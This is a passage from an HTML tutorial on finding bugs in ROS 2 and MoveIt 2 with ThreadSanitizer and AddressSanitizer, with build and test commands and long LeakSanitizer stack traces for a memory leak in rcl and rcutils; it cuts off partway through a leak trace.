    <span id="cb71-31"><a href="#cb71-31" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 6 tests from 1 test case ran. <span class="er">(</span><span class="ex">2985</span> ms total<span class="kw">)</span></span>
    <span id="cb71-32"><a href="#cb71-32" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">6</span> tests.</span></code></pre></div>
    <h3 id="looking-for-bugs-and-vulnerabilities-in-moveit-2-with-threadsanitizer-tsan">Looking for bugs and vulnerabilities in MoveIt 2 with ThreadSanitizer (TSan)</h3>
    <p>To use TSan [3] we rebuild the container (uncommenting and commenting the right sections) access it and manually launch the tests:</p>
    <div class="sourceCode" id="cb72"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_vulnerabilities2:latest .</span>
    <span id="cb72-2"><a href="#cb72-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> <span class="at">-v</span> /tmp/log:/opt/ros2_moveit2_ws/log basic_cybersecurity_vulnerabilities2:latest /bin/bash</span>
    <span id="cb72-3"><a href="#cb72-3" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-tsan <span class="at">--install-base</span><span class="op">=</span>install-tsan <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--packages-up-to</span> moveit_core <span class="at">--merge-install</span></span></code></pre></div>
    <p>No issues where found while running TSan (up until <code>moveit_core</code>).</p>
    <h3 id="resources-3">Resources</h3>
    <ul>
    <li>[1] https://github.com/colcon/colcon-sanitizer-reports/blob/master/README.rst</li>
    <li>[2] https://discourse.ros.org/t/exploring-package-dependencies/4719</li>
    <li>[3] TSan Cpp manual https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual</li>
    </ul>
    <h2 id="debugging-output-of-robot-sanitizers-with-gdb-hunting-and-fixing-bugs">Debugging output of robot sanitizers with GDB, hunting and fixing bugs</h2>
    <p>This article aims to describe the process of introspecting memory leaks by directly connecting the debugger with the sanitizer-tests/binaries. The tutorial builds on top of the previous two articles, refer to <a href="../tutorial1">tutorial1</a> and <a href="../tutorial2">tutorial2</a>.</p>
    <h3 id="fetch-the-bugs">Fetch the bugs</h3>
    <p>Similar to [1]:</p>
    <pre class="smallcontent"><code>```bash
    # Build the code with ASan
    colcon build --build-base=build-asan --install-base=install-asan --cmake-args -DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS=ON -DINSTALL_EXAMPLES=OFF -DSECURITY=ON --no-warn-unused-cli -DCMAKE_BUILD_TYPE=Debug --mixin asan-gcc --symlink-install

    # Launch tests with ASan
    colcon test --build-base=build-asan --install-base=install-asan --event-handlers sanitizer_report+
    ```</code></pre>
    <p>The complete set of bugs found has been captured and dumped at <a href="sanitizer_report_ros2dashing.csv">sanitizer_report_ros2dashing.csv</a> file.</p>
    <h3 id="gaining-some-additional-understanding">Gaining some additional understanding</h3>
    <p>Let’s pick the first vulnerability and start exploring it and the structure of its code and relationships:</p>
    <p>First flaw: detected memory leak in rcl</p>
    <pre class="smallcontent"><code>```bash
    rcl,detected memory leaks,__default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56,4,&quot;    
        #0 0x7f762845bd38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f7627a484d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f7627a5ae77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54
        #3 0x7f7627839b4a in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:66
        #4 0x7f7624cdf362 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199
        #5 0x7f7624ce1c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #6 0x7f7624ce20d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #7 0x7f7627dd4a25 in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_dynamic_cpp/src/rmw_node_info_and_types.cpp:64
        #8 0x7f762811a875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #9 0x5565b057589d in TestGraphFixture__rmw_fastrtps_dynamic_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #10 0x5565b062d9c5 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #11 0x5565b061fb19 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #12 0x5565b05cc601 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #13 0x5565b05cda2c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #14 0x5565b05ce5d0 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #15 0x5565b05e96e1 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #16 0x5565b0630478 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #17 0x5565b0621de2 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #18 0x5565b05e6475 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #19 0x5565b05b99c4 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #20 0x5565b05b990a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #21 0x7f7626a81b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)&quot;

    ```</code></pre>
    <p>This first bug seems to apply to <code>rcl</code> but crashies in <code>rcutils</code>. Let’s see if we can visualize its relationship with detected bugs. First, let’s plot the complete graph of relationships:</p>
    <pre class="smallcontent"><code>```bash
    colcon list --topological-graph-dot | dot -Tpng -o deps.png
    ```</code></pre>
    <p>This will generate a report of <strong>all</strong> dynamic bugs found while reviewing ROS 2 Dashing Diademata with ASan sanitizer. The plot generated is available in <a href="deps_all.png">deps_all.png</a> (<em>warning</em>: this file is 27M). This is frankly to bussy to make sense of it so let’s try to simplify the plot:</p>
    <pre class="smallcontent"><code>```bash
    colcon list --topological-graph-dot --packages-above-depth 1 rcutils | dot -Tpng -o deps.png
    ```</code></pre>
    <p><img src="deps_rcutils.png" /></p>
    <p><em>legend: blue=build, red=run, tan=test, dashed=indirect</em></p>
    <p>In this graph we can see that <code>rcutils</code> package is used by a variety of other packages and likely, it seems that the leak is happening through one of the rcl-related tests. Let’s next try to reproduce the bug by finding the right test that triggers the memory leak.</p>
    <h3 id="getting-ready-to-debug">Getting ready to debug</h3>
    <p>Let’s find the test that actually allows us to reproduce this: ~~~smallcontent</p>
    <div class="sourceCode" id="cb77"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a><span class="co"># source the install directory</span></span>
    <span id="cb77-2"><a href="#cb77-2" aria-hidden="true" tabindex="-1"></a><span class="bu">source</span> /opt/ros2_asan_ws/install-asan/setup.bash</span>
    <span id="cb77-3"><a href="#cb77-3" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/ros2_asan_ws/build-asan/rcl</span>
    <span id="cb77-4"><a href="#cb77-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./test_graph__rmw_fastrtps_cpp</span></span></code></pre></div>
    <pre><code>

    this will produce:

    Dump of `test_graph__rmw_fastrtps_cpp`

    ~~~smallcontent
    ```bash
    # source the worspace itself
    source install-asan/setup.bash
    # cd &lt;whatever test dir&gt;
      
     ## Launch the actual failing test
    ./test_graph__rmw_fastrtps_cpp
    Running main() from /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc
    [==========] Running 14 tests from 2 test cases.
    [----------] Global test environment set-up.
    [----------] 11 tests from TestGraphFixture__rmw_fastrtps_cpp
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_and_destroy_topic_names_and_types
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_and_destroy_topic_names_and_types (23 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_service_names_and_types
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_service_names_and_types (20 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_names_and_types_init
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_names_and_types_init (22 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_publisher_names_and_types_by_node
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node:
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: _InvalidNodeName
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: /test_rcl_get_publisher_names_and_types_by_node
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_publisher_names_and_types_by_node (19 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_subscriber_names_and_types_by_node
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node:
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: _InvalidNodeName
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: /test_rcl_get_subscriber_names_and_types_by_node
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_subscriber_names_and_types_by_node (21 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_service_names_and_types_by_node
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node:
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: _InvalidNodeName
    [ERROR] [rmw_fastrtps_shared_cpp]: Unable to find GUID for node: /test_rcl_get_service_names_and_types_by_node
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_service_names_and_types_by_node (24 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_count_publishers
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_count_publishers (19 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_count_subscribers
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_count_subscribers (20 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_graph_query_functions
    [INFO] [rcl]:  Try 1: 0 publishers, 0 subscribers, and that the topic is not in the graph.
    [INFO] [rcl]:   state correct!
    [INFO] [rcl]:  Try 1: 1 publishers, 0 subscribers, and that the topic is in the graph.
    [INFO] [rcl]:   state correct!
    [INFO] [rcl]:  Try 1: 1 publishers, 1 subscribers, and that the topic is in the graph.
    [INFO] [rcl]:   state correct!
    [INFO] [rcl]:  Try 1: 0 publishers, 1 subscribers, and that the topic is in the graph.
    [INFO] [rcl]:   state correct!
    [INFO] [rcl]:  Try 1: 0 publishers, 0 subscribers, and that the topic is not in the graph.
    [INFO] [rcl]:   state correct!
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_graph_query_functions (22 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_graph_guard_condition_topics
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;400000000&#39; nanoseconds for graph changes
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_graph_guard_condition_topics (1234 ms)
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_service_server_is_available
    [INFO] [rcl]: waiting up to &#39;1000000000&#39; nanoseconds for graph changes
    [INFO] [rcl]: waiting up to &#39;1000000000&#39; nanoseconds for graph changes
    [       OK ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_service_server_is_available (36 ms)
    [----------] 11 tests from TestGraphFixture__rmw_fastrtps_cpp (1460 ms total)

    [----------] 3 tests from NodeGraphMultiNodeFixture
    [ RUN      ] NodeGraphMultiNodeFixture.test_node_info_subscriptions
    [       OK ] NodeGraphMultiNodeFixture.test_node_info_subscriptions (1037 ms)
    [ RUN      ] NodeGraphMultiNodeFixture.test_node_info_publishers
    [       OK ] NodeGraphMultiNodeFixture.test_node_info_publishers (1040 ms)
    [ RUN      ] NodeGraphMultiNodeFixture.test_node_info_services
    [       OK ] NodeGraphMultiNodeFixture.test_node_info_services (1035 ms)
    [----------] 3 tests from NodeGraphMultiNodeFixture (3112 ms total)

    [----------] Global test environment tear-down
    [==========] 14 tests from 2 test cases ran. (4572 ms total)
    [  PASSED  ] 14 tests.

    =================================================================
    ==30425==ERROR: LeakSanitizer: detected memory leaks

    Direct leak of 56 byte(s) in 1 object(s) allocated from:
        #0 0x7f5278a99d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f52781e54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f5277fd6c7e in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:72
        #3 0x7f5275880362 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199
        #4 0x7f5275882c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #5 0x7f52758830d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #6 0x7f52784931eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
        #7 0x7f5278758875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #8 0x55d37431a0ed in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #9 0x55d3743d2215 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #10 0x55d3743c4369 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #11 0x55d374370e51 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #12 0x55d37437227c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #13 0x55d374372e20 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #14 0x55d37438df31 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #15 0x55d3743d4cc8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #16 0x55d3743c6632 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #17 0x55d37438acc5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #18 0x55d37435e214 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #19 0x55d37435e15a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #20 0x7f527721eb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

    Direct leak of 8 byte(s) in 1 object(s) allocated from:
        #0 0x7f5278a99d38 in __interceptor_calloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xded38)
        #1 0x7f52781e54d6 in __default_zero_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
        #2 0x7f52781f7e77 in rcutils_string_array_init /opt/ros2_asan_ws/src/ros2/rcutils/src/string_array.c:54
        #3 0x7f5277fd6b4a in rmw_names_and_types_init /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:66
        #4 0x7f5275880362 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199
        #5 0x7f5275882c4d in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
        #6 0x7f52758830d4 in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
        #7 0x7f52784931eb in rmw_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
        #8 0x7f5278758875 in rcl_get_publisher_names_and_types_by_node /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
        #9 0x55d37431a0ed in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody() /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
        #10 0x55d3743d2215 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #11 0x55d3743c4369 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #12 0x55d374370e51 in testing::Test::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
        #13 0x55d37437227c in testing::TestInfo::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
        #14 0x55d374372e20 in testing::TestCase::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
        #15 0x55d37438df31 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
        #16 0x55d3743d4cc8 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
        #17 0x55d3743c6632 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
        #18 0x55d37438acc5 in testing::UnitTest::Run() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
        #19 0x55d37435e214 in RUN_ALL_TESTS() /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
        #20 0x55d37435e15a in main /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
        #21 0x7f527721eb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

    Indirect leak of 23 byte(s) in 1 object(s) allocated from:
        #0 0x7f5278a99b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
        #1 0x7f52781e5465 in __default_allocate /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:35
        #2 0x7f52781f7c2f in rcutils_strndup /opt/ros2_asan_ws/src/ros2/rcutils/src/strdup.c:42
        #3 0x7f52781f7bae in rcutils_strdup /opt/ros2_asan_ws/src/ros2/rcutils/src/strdup.c:33
        #4 0x7f5275880a99 in rmw_fastrtps_shared_cpp::__copy_data_to_results(std::map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const, std::set&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::less&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt; const&amp;, rcutils_allocator_t*, bool, rmw_names_and_types_t*) /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:248
